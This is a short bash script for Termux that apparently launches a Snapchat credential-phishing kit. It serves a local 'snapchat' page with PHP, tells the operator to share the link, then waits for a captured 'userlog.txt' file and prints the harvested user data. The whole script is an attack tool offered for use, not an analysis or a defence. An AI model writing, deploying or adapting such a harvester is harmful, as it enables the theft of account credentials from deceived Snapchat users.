#!/data/data/com.termux/files/usr/bin/bash
#Starting localhost ::PHP
#clear previous file 
cd snapchat
#rm -rf userlog.txt
cd ..
                                                                           
localhost(){               

    echo -ne "\e[34m{\e[36m÷\e[34m}\e[31mEnter a port number: "
    read portnum
    echo " "
    echo " "
    echo -e "\e[31m[\e[0m!\e[31m]\e[38mTrying to start localhost Wait..."
    php -S localhost:$portnum -t snapchat > /dev/null 2>&1 & sleep 2
    echo " "
    echo -e "\e[31m[\e[34m+\e[31m]\e[35m Copy and paste link http://localhost:$portnum"
}                                                                                                   
localhost
data_found(){
    cd snapchat
    while true;do
        if [ -f userlog.txt ];then
            echo " "
            echo " "

            echo -e "\e[31m[\e[34m+\e[31]\e[0mUser data found"
            echo " "
            echo " "
            cat userlog.txt           
            
            break;              
        fi
    done
}
data_found       
                                                                                    
